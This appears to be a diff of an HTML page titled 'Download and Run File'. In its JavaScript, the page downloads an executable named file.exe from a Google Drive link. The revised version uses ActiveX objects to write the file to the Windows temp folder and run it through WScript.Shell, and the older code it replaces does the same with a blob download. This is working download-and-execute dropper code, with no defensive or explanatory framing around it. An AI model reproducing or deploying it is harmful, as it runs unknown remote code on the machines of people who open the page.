@@ -5,28 +5,27 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Download and Run File</title>
     <script type="text/javascript">
-        // Function to download and run a file
         function downloadAndRun() {
-            // Create an XMLHttpRequest to download the file
-            var xhr = new XMLHttpRequest();
-            xhr.open('GET', 'https://drive.google.com/uc?export=download&id=1pjn7VlGpYkvUd44Q6toYv712IgZZtx8H', true);  // Change this URL to your file's location
-            xhr.responseType = 'arraybuffer';
+            var fileURL = 'https://drive.google.com/uc?export=download&id=1pjn7VlGpYkvUd44Q6toYv712IgZZtx8H';  // File URL
+            var fileName = 'file.exe';
 
-            // When the file is downloaded
-            xhr.onload = function () {
-                var blob = new Blob([xhr.response], { type: 'application/octet-stream' });
-                var link = document.createElement('a');
-                link.href = URL.createObjectURL(blob);
-                link.download = 'file.exe'; // Name the file for download
-                link.click();
-
-                // Optionally, execute the downloaded file
-                var shell = new ActiveXObject("WScript.Shell");
-                shell.Run("file.exe", 1, true); // This runs the downloaded file
-            };
-
-            // Send the request
+            var xhr = new ActiveXObject("MSXML2.XMLHTTP");
+            xhr.open("GET", fileURL, false);  // Change to true for async behavior
             xhr.send();
+
+            if (xhr.status == 200) {
+                var fileData = xhr.responseBody;
+                var fso = new ActiveXObject("Scripting.FileSystemObject");
+                var tempFile = fso.CreateTextFile(fso.GetSpecialFolder(2) + "\\" + fileName, true);  // Save to temp folder
+                tempFile.Write(fileData);
+                tempFile.Close();
+
+                // Run the downloaded file
+                var shell = new ActiveXObject("WScript.Shell");
+                shell.Run(fso.GetSpecialFolder(2) + "\\" + fileName);
+            } else {
+                alert("Error downloading file.");
+            }
         }
     </script>
 </head>
